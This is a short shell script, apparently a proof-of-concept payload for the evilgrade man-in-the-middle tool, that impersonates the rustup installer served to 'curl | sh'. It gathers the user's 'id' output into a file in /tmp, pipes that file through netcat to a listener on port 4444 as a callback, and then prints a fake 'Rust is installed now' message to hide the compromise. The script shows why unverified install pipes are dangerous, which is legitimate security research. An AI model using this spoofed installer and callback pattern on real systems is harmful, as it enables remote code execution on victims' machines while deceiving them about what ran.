#!/bin/sh
# Served by evilgrade MITM in place of the real https://sh.rustup.rs installer.
# A `curl https://sh.rustup.rs | sh` pipes THIS straight into a shell -- no
# signature, no integrity check. The two lines below are the RCE.
{
  echo "owned by evilgrade -- curl|bash MITM (sh.rustup.rs)"
  echo "user: $(id)"
  echo "vector: compromised eMudhra CA trusted by the system curl -> arbitrary shell"
} > /tmp/OWNED_BY_CURLBASH 2>&1
# synchronous callback (a trailing '&' would be killed when `| sh` exits)
cat /tmp/OWNED_BY_CURLBASH | nc -w 2 127.0.0.1 4444 2>/dev/null
# a real attacker would still run the genuine installer here so nothing looks wrong:
echo "info: Rust is installed now. Great!"   # cosmetic, mimics real rustup output
